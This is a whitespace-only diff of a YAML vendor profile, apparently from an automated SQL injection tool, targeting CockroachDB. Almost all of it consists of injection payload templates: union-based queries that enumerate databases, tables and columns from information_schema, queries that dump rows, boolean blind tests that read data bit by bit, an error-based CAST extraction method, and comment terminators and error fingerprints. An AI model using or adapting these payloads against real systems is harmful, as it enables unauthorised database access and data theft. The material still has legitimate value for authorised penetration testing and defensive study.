@@ -1,6 +1,6 @@
 vendor: CockroachDB
 
-resource: 
+resource:
  info: |
   concat_ws(
       '${enclose_value_sql}',
@@ -9,10 +9,10 @@ resource:
       '-'
   )
   || '${trail_sql}'
-  
- schema: 
+
+ schema:
   database: |
-   select 
+   select
        concat_agg(
            '${enclose_value_sql}'
            || r
@@ -31,7 +31,7 @@ resource:
        order by 1
        ${limit}
    ) x
-   
+
   table: |
    select
        concat_agg(
@@ -44,7 +44,7 @@ resource:
        )
        || '${trail_sql}'
    from (
-       SELECT 
+       SELECT
            tables.table_name r,
            '0' q
        FROM information_schema.tables
@@ -52,9 +52,9 @@ resource:
        order by 1
        ${limit}
    ) x
-   
+
   column: |
-   select 
+   select
        concat_agg(
            '${enclose_value_sql}'
            || r
@@ -65,8 +65,8 @@ resource:
        )
        || '${trail_sql}'
    from (
-       SELECT 
-           columns.column_name r, 
+       SELECT
+           columns.column_name r,
            '0' q
        FROM information_schema.columns
        where columns.TABLE_SCHEMA = '${database}'
@@ -74,10 +74,10 @@ resource:
        order by 1
        ${limit}
    )x
-   
-  row: 
+
+  row:
    query: |
-    select 
+    select
         concat_agg(
             '${enclose_value_sql}'
             || r
@@ -88,19 +88,19 @@ resource:
         )
         || '${trail_sql}'
     from (
-        SELECT 
+        SELECT
             substr((${fields}), 1, 775) r,
             count(*) q
         FROM ${database}.${table}
         group by 1
         ${limit}
     )x
-   fields: 
+   fields:
     field: trim(coalesce(${field.value}::text, ''))
     concat: "|| '%7f' ||"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
    select
        /**
@@ -120,25 +120,25 @@ strategy:
   calibrator: repeat('%23', 1024)
   limitBoundary: 0
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - cockroachdb
-    
- normal: 
+
+ normal:
   indices: union select ${indices}
   capacity: (select '${lead}${indice}' || ${calibrator})
   orderBy: order by 1337
-  
- boolean: 
-  test: 
-   falses: 
+
+ boolean:
+  test:
+   falses:
     - true = false
     - true %21= true
     - false %21= false
     - 1 = 2
     - 1 %21= 1
     - 2 %21= 2
-   trues: 
+   trues:
     - true = true
     - false = false
     - true %21= false
@@ -154,26 +154,26 @@ strategy:
     0 != (
         ascii(
             substr(
-                (${injection}), 
-                ${window.char}, 
+                (${injection}),
+                ${window.char},
                 1
             )
-        ) 
+        )
         %26 ${bit}
     )
    length: length((${injection})) > ${window.char}
   modeAnd: and
   modeOr: or
   blind: ${boolean.mode} ${test}
-  
- error: 
-  method: 
+
+ error:
+  method:
    - name: CAST::text_numeric
      query: |
       /* Require FALSE statement, then OR */
-      and 1 = 0 
+      and 1 = 0
       or 1 = CAST(
-          (${window})::text 
+          (${window})::text
           AS NUMERIC
       )
      capacity: 255
